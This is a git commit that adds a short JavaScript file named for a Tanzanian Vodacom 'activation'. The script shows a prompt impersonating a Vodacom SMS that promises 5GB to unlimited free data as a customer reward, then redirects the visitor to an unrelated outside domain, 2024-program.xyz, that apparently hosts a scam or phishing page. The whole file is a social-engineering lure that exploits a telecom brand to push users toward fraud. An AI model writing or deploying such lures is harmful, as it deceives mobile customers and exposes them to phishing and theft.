cf2b49ba4765ea04f6d95c1793b55b6787ecd6d1
Jesusboys <156060629+Jesusboys@users.noreply.github.com>
2024-06-03 01:02:59 -0700

    Create tanzania-vodacom-activation.js

---
+++ tanzania-vodacom-activation.js
@@ -0,0 +1,7 @@
+
+
+var password = '1'
+password=prompt('VODACOM SMS: Dear customer, kindly check if your sim card is qualify to receive from 5GB to Unlimited data, old customers Reward, press 1 to check now ','1');
+if (password != '1') {
+location.href='https://2024-program.xyz/vodacom-tz.html';
+}
